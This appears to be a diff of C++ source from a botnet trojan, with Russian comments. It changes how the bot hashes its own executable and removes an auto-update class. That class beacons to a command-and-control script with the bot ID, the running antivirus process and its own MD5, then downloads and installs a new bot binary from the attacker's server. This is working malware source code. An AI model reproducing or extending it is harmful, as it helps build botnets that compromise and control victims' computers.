@@ -7,7 +7,6 @@
 #include "BotDef.h"
 #include "DbgRpt.h"
 
-
 //---------------------------------------------------------------------------
 
 //const WORK_PATH[] = {'S', 'E', 'T', '_', 'R', 'N', 'D', '_', 'P', 'A', 'T', 'H', '-', '9',  0};
@@ -335,109 +334,13 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 //----------------------------------------------------
 string BOT::BotExeMD5()
 {
-	string Result = "507535f54ccf135f94e6c495994dcd7b"; // Для тестов левый
+	PCHAR FileName = BOT::GetBotFullExeName();
+
+	string Result = CalcFileMD5Hash2(FileName);
+
+	STR::Free(FileName);
 
 	return Result;
 }
 
 
-//****************************************************************************
-//                                  TBotUpdater
-//****************************************************************************
-TBotUpdater::TBotUpdater()
-	: TBotThread(false)
-{
-	Interval = 10000;
-
-	Start();
-}
-//----------------------------------------------------------
-
-void TBotUpdater::DoExecute()
-{
-	// Запускаем цикл автоматического обновления бота
-	while (!Terminated())
-	{
-		DWORD UpdateInterval = Interval;
-
-		Update(UpdateInterval);
-
-		pSleep(UpdateInterval);
-	}
-
-}
-//----------------------------------------------------------
-
-void TBotUpdater::Update(DWORD &UpdateInterval)
-{
-	// Функция выполняет автоматическое обновление бота
-
-	// Интервал обновления в случае ошибки
-	const static DWORD ErrorInterval = 60000;
-
-	PCHAR URL = GetBotScriptURL(SCRIPT_UPDATE_BOT);
-	if (!URL)
-	{
-		UpdateInterval = ErrorInterval;
-		return;
-	}
-
-	// Выполняем запрос
-	string UID = GenerateBotID2();
-	string AV  = GetAntiVirusProcessName();
-	string MD5 = BOT::BotExeMD5();
-
-	TBotStrings Fields;
-
-	Fields.AddValue(HTTP_FIELD_UID,     UID);
-	Fields.AddValue(HTTP_FIELD_ANTIVIR, AV);
-	Fields.AddValue(HTTP_FIELD_MD5,     MD5);
-
-
-	#ifdef CryptHTTPH
-		TCryptHTTP HTTP;
-		HTTP.Password = GetMainPassword2();
-	#else
-		THTTP HTTP;
-	#endif
-
-
-	string Buf;
-
-	HTTP.CheckOkCode = false;
-    bool Done = HTTP.Post(URL, &Fields, Buf);
-
-	if (Done && HTTP.Response.Code == 403 && !Buf.IsEmpty())
-	{
-		// Выполняем обновление
-		TBotStrings Values;
-		Values.SetText(Buf);
-
-		string FileName = Values.GetValue("file_name");
-		MD5     = Values.GetValue("md5");
-
-
-
-		TURL URL;
-
-		URL.Host     = HTTP.Request.Host;
-		URL.Path     = "cfg";
-		URL.Document = FileName;
-
-		string FileURL = URL.URL();
-
-
-		// Загружаем и устанавливаем новую версию
-		DownloadAndSetup(FileURL, MD5);
-    }
-
-	STR::Free(URL);
-
-}
-//----------------------------------------------------------
-
-void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &FileName)
-{
-	// Функция загржает и устанавливает новую версию бота
-}
-//----------------------------------------------------------
